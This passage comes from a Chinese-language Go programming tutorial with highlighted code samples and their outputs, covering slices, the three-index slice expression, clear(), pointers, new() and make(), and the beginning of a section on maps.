class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span>]<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span>]<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>data := [...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>&#125;<br>fmt.Println(data)<br><br>s1 := data[<span class="hljs-number">8</span>:]<span class="hljs-comment">//取 data[8] 到 data[9] </span><br>s2 := data[:<span class="hljs-number">5</span>]<span class="hljs-comment">//取 data[0] 到 data[4]</span><br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s1)<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s2)<br><br><span class="hljs-built_in">copy</span>(s2, s1)<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s1)<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s2)<br>fmt.Println(data)<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>]<br>[<span class="hljs-number">8</span> <span class="hljs-number">9</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span>]<br>[<span class="hljs-number">8</span> <span class="hljs-number">9</span>]<br>[<span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span>]<br>[<span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>]<br></code></pre></td></tr></table></figure><p>s2 是 data 的引用，所以后面 s2 变化导致了 data 的变化</p><h2 id="slice-遍历"><a href="#slice-遍历" class="headerlink" title="slice 遍历"></a>slice 遍历</h2><p>跟其他遍历差不多</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>data := [...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>&#125;<br>slice := data[:]<br><span class="hljs-keyword">for</span> value := <span class="hljs-keyword">range</span> slice &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%v,&quot;</span>, value)<br><br>&#125;<br>&#125;<br>&gt;&gt;<br><span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<br></code></pre></td></tr></table></figure><h2 id="切片-resize"><a href="#切片-resize" class="headerlink" title="切片 resize"></a>切片 resize</h2><p>调整大小</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a = []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;%v,%v\n&quot;</span>, a, <span class="hljs-built_in">len</span>(a))<br><br>b := a[<span class="hljs-number">1</span>:<span class="hljs-number">2</span>]<br>fmt.Printf(<span class="hljs-string">&quot;%v,%v\n&quot;</span>, b, <span class="hljs-built_in">len</span>(b))<br><br>c := b[<span class="hljs-number">0</span>:<span class="hljs-number">3</span>]<br>fmt.Printf(<span class="hljs-string">&quot;%v,%v&quot;</span>, c, <span class="hljs-built_in">len</span>(c))<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span>],<span class="hljs-number">5</span><br>[<span class="hljs-number">2</span>],<span class="hljs-number">1</span><br>[<span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span>],<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h2 id="字符串和切片"><a href="#字符串和切片" class="headerlink" title="字符串和切片"></a>字符串和切片</h2><p>string 底层是一个 byte 的数组，所以也能进行切片</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>str := <span class="hljs-string">&quot;butt3rf1y&quot;</span><br>s1 := str[<span class="hljs-number">0</span>:<span class="hljs-number">5</span>]<br>fmt.Println(s1)<br><br>s2 := str[<span class="hljs-number">6</span>:]<br>fmt.Println(s2)<br>&#125;<br>&gt;&gt;<br>butt3<br>f1y<br></code></pre></td></tr></table></figure><p>string 是不可变的，不能直接修改，可以将字符转化为字节切片，修改之后再转为字符</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>str := <span class="hljs-string">&quot;butt3rf1y&quot;</span><br>    s := []<span class="hljs-type">byte</span>(str) <span class="hljs-comment">//中文字符用 []rune(str)</span><br>s[<span class="hljs-number">7</span>] = <span class="hljs-string">&#x27;h&#x27;</span><br>s = s[:<span class="hljs-number">8</span>]<br>s = <span class="hljs-built_in">append</span>(s, <span class="hljs-string">&#x27;!&#x27;</span>)<br>str = <span class="hljs-type">string</span>(s)<br>fmt.Println(str)<br>&#125;<br>&gt;&gt;<br>butt3rfh!<br></code></pre></td></tr></table></figure><h2 id="多维切片"><a href="#多维切片" class="headerlink" title="多维切片"></a>多维切片</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> nums [<span class="hljs-number">5</span>][<span class="hljs-number">5</span>]<span class="hljs-type">int</span><br><span class="hljs-keyword">for</span> _, num := <span class="hljs-keyword">range</span> nums &#123;<br>fmt.Println(num)<br>&#125;<br>fmt.Println()<br>slices := <span class="hljs-built_in">make</span>([][]<span class="hljs-type">int</span>, <span class="hljs-number">5</span>)<br><span class="hljs-keyword">for</span> _, slice := <span class="hljs-keyword">range</span> slices &#123;<br>fmt.Println(slice)<br>&#125;<br><br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br><br>[]<br>[]<br>[]<br>[]<br>[]<br></code></pre></td></tr></table></figure><p>Go 的数组和切片都是一维的，要创建二维数组或切片需要定义一个数组的数组或切片的切片。从上面例子能看出来，数组初始化时一维和二维长度是固定了，而切片是不固定的，所以切片需要单独初始化</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>slices := <span class="hljs-built_in">make</span>([][]<span class="hljs-type">int</span>, <span class="hljs-number">5</span>)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>(slices); i++ &#123;<br>slices[i] = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">5</span>)<br>&#125;<br>fmt.Println(slices)<br>&#125;<br>&gt;&gt;<br>[[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]]<br></code></pre></td></tr></table></figure><h2 id="拓展表达"><a href="#拓展表达" class="headerlink" title="拓展表达"></a>拓展表达</h2><p><strong>只有切片才能使用拓展表达</strong>，解决切片共享底层数组的读写问题</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">slice[low:high:max]</span><br><span class="hljs-section">low: 起始索引</span><br><span class="hljs-section">high: 结束索引(不包含)</span><br><span class="hljs-section">max: 最大容量</span><br></code></pre></td></tr></table></figure><p>像前面说的，s1 和 s2 共享的是一个底层数组，那么对 s2 进行改变时也会对 s1 有影响，比如说</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>s1 := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>&#125;<br>s2 := s1[<span class="hljs-number">3</span>:<span class="hljs-number">4</span>]<br>s2 = <span class="hljs-built_in">append</span>(s2, <span class="hljs-number">1</span>)<br>fmt.Println(s2)<br>fmt.Println(s1)<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">7</span> <span class="hljs-number">1</span>]<br>[<span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">1</span> <span class="hljs-number">9</span>]<br></code></pre></td></tr></table></figure><p>这个就会影响 s1 的数据，向 s2 添加元素，把 s1 更改了，这个时候用拓展表达式就能解决了</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go">s2 := s1[<span class="hljs-number">3</span>:<span class="hljs-number">4</span>:<span class="hljs-number">4</span>]<br>&gt;&gt;<br>[<span class="hljs-number">7</span> <span class="hljs-number">1</span>]<br>[<span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>]<br></code></pre></td></tr></table></figure><h2 id="clear"><a href="#clear" class="headerlink" title="clear()"></a>clear()</h2><p>clear() 会将切片内所有的值置为零值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>s := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;<br>clear(s)<br>fmt.Println(s)<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><p>清空切片</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  s := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;<br>    s = s[:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>]<br>  fmt.Println(s)<br>&#125;<br>&gt;&gt;<br>[]<br></code></pre></td></tr></table></figure><h1 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h1><p>Go 中是指针不能进行偏移和运算，有两个常用操作符：取地址符 <code>&amp;</code>，解引用符 <code>*</code></p><h2 id="指针地址"><a href="#指针地址" class="headerlink" title="指针地址"></a>指针地址</h2><p>&amp; 取地址，取变量指针</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts">ptr := <span class="hljs-variable">&amp;v</span><span class="hljs-comment">//v 的类型为 T</span><br><span class="hljs-symbol">v:</span>被取地址的变量，类型为 T<br><span class="hljs-symbol">ptr:</span>接收地址的变量，ptr 的类型为 *T，为 T 的指针类型<br></code></pre></td></tr></table></figure><p>比如说</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := <span class="hljs-number">10</span><br>b := &amp;a<br>fmt.Printf(<span class="hljs-string">&quot;a:%d ptr:%p\n&quot;</span>, a, &amp;a)<br>fmt.Printf(<span class="hljs-string">&quot;b:%p type:%T\n&quot;</span>, b, b)<br>fmt.Println(&amp;b)<br>&#125;<br>&gt;&gt;<br>a:<span class="hljs-number">10</span> ptr:<span class="hljs-number">0xc00008c098</span><br>b:<span class="hljs-number">0xc00008c098</span> <span class="hljs-keyword">type</span>:*<span class="hljs-type">int</span><br><span class="hljs-number">0xc000090048</span><br></code></pre></td></tr></table></figure><h2 id="指针取值"><a href="#指针取值" class="headerlink" title="指针取值"></a>指针取值</h2><p>对普通变量使用 <code>&amp;</code> 取地址后会获得这个变量的指针，然后对指针使用 <code>*</code> 解引用，也就是指针取值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := <span class="hljs-number">10</span><br>b := &amp;a<br>fmt.Printf(<span class="hljs-string">&quot;%T\n&quot;</span>, b)<br><br>c := *b<br>fmt.Printf(<span class="hljs-string">&quot;%T\n&quot;</span>, c)<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, c)<br>&#125;<br>&gt;&gt;<br>*<span class="hljs-type">int</span><br><span class="hljs-type">int</span><br><span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><p>  取地址操作符 <code>&amp;</code> 和取值操作符 <code>*</code> 是一对互补操作符，<code>&amp;</code> 取出地址，<code>*</code> 根据地址取出地址指向的值</p><p>而且 <code>*</code> 还能声明指针</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> numPtr *<span class="hljs-type">int</span><br>fmt.Println(numPtr)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>*int</code> 代表变量是 <code>int</code> 型指针，指针必须要初始化，不然就是空指针，可以取地址符将其他变量的地址赋给该指针，还能使用内置函数 <code>new</code>() 手动分配</p><h2 id="new"><a href="#new" class="headerlink" title="new()"></a>new()</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> numPtr *<span class="hljs-type">int</span><br>numPtr = <span class="hljs-built_in">new</span>(<span class="hljs-type">int</span>)<br>fmt.Println(numPtr)<br>&#125;<br>&gt;&gt;<br><span class="hljs-number">0xc00008c098</span><br></code></pre></td></tr></table></figure><p><code>new()</code> 函数只有一个参数，参数为类型，返回一个对应类型的指针，会对指针分配内存，并且指针指向对应类型的零值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(*<span class="hljs-built_in">new</span>(<span class="hljs-type">string</span>))<br>fmt.Println(*<span class="hljs-built_in">new</span>(<span class="hljs-type">int</span>))<br>fmt.Println(*<span class="hljs-built_in">new</span>([<span class="hljs-number">5</span>]<span class="hljs-type">int</span>))<br>fmt.Println(*<span class="hljs-built_in">new</span>([]<span class="hljs-type">float64</span>))<br>&#125;<br>&gt;&gt;<br><br><span class="hljs-number">0</span><br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[]<br></code></pre></td></tr></table></figure><p>变量、指针地址、指针变量、取地址、取值</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode">对变量进行取地址 <span class="hljs-comment">(&amp;)</span>，可以得到变量的指针变量<br>指针变量值为指针地址<br>指针变量进行取值 <span class="hljs-comment">(*)</span>，可以得到指针变量指向的原变量的值<br></code></pre></td></tr></table></figure><p>指针传值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ptr1</span><span class="hljs-params">(x <span class="hljs-type">int</span>)</span></span> &#123;<br>x = <span class="hljs-number">100</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ptr2</span><span class="hljs-params">(x *<span class="hljs-type">int</span>)</span></span> &#123;<br>*x = <span class="hljs-number">100</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := <span class="hljs-number">10</span><br>ptr1(a)<br>fmt.Println(a)<br>ptr2(&amp;a)<br>fmt.Println(a)<br>&#125;<br>&gt;&gt;<br><span class="hljs-number">10</span><br><span class="hljs-number">100</span><br></code></pre></td></tr></table></figure><p>值传递不会影响 a 的值，所以第一次输出 a 的值不变</p><h2 id="make"><a href="#make" class="headerlink" title="make"></a>make</h2><p>和 new() 一样，是用来分配内存的，但是与 new() 有区别的是，它只用于 slice、map 和 channel 的内存创建，返回的类型就是这三个类型本身，而不是指针类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">make</span><span class="hljs-params">(t Type,size ...IntegerType)</span></span> Type<br></code></pre></td></tr></table></figure><p>比如说</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> b <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span><br>b = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>, <span class="hljs-number">10</span>)<br>b[<span class="hljs-string">&quot;aaa&quot;</span>] = <span class="hljs-number">100</span><br>fmt.Println(b)<br>&#125;<br>&gt;&gt;<br><span class="hljs-keyword">map</span>[aaa:<span class="hljs-number">100</span>]<br></code></pre></td></tr></table></figure><p><strong>区别</strong></p><p>make() 只用于 slice、map 以及 channel 的初始化，返回的还是这三个类型本身</p><p>new() 用于类型的内存分配，并对内存对应的值为类型零值，返回指向类型的指针</p><h1 id="map"><a href="#map" class="headerlink" title="map"></a>map</h1><p>映射表的数据结构实现通常两种：哈希表 (hash table ) 和搜索树 (search tree)，无序和有序。在 Go 中 map 的实现是基于哈希桶，所以也无序，必须要初始化才能使用</p><h2 id="初始化-1"><a href="#初始化-1" class="headerlink" title="初始化"></a>初始化</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">map</span>[KeyType]ValueType<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>scoreMap := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>, <span class="hljs-number">8</span>)<br>scoreMap[<span class="hljs-string">&quot;butt3rf1y&quot;</span>] = <span class="hljs-number">100</span><br>scoreMap[<span class="hljs-string">&quot;butt3rf2y&quot;</span>] = <span class="hljs-number">90</span><br>fmt.Println(scoreMap)<br>fmt.Println(scoreMap[<span class="hljs-string">&quot;butt3rf2y&quot;</span>])<br>fmt.Printf(<span class="hljs-string">&quot;%T\n&quot;</span>, scoreMap)<br>&#125;<br>&gt;&gt;<br><span class="hljs-keyword">map</span>[butt3rf1y:<span class="hljs-number">100</span> butt3rf2y:<span class="hljs-number">90</span>]<br><span class="hljs-number">90</span><br><span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span><br></code></pre></td></tr></table></figure><p>map 类型的变量默认初始值为 nil，需要用 <code>make()</code> 函数来分配内存</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[KeyType]ValueType,[<span class="hljs-built_in">cap</span>])<br></code></pre></td></tr></table></figure><p>接收两个参数，类型与初始容量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">mp1 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>, <span class="hljs-number">8</span>)<br>mp2 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>][]<span class="hljs-type">int</span>, <span class="hljs-number">10</span>)<br></code></pre></td></tr></table></figure><p>map 数据都是成对出现的。支持在声明的时填充元素</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 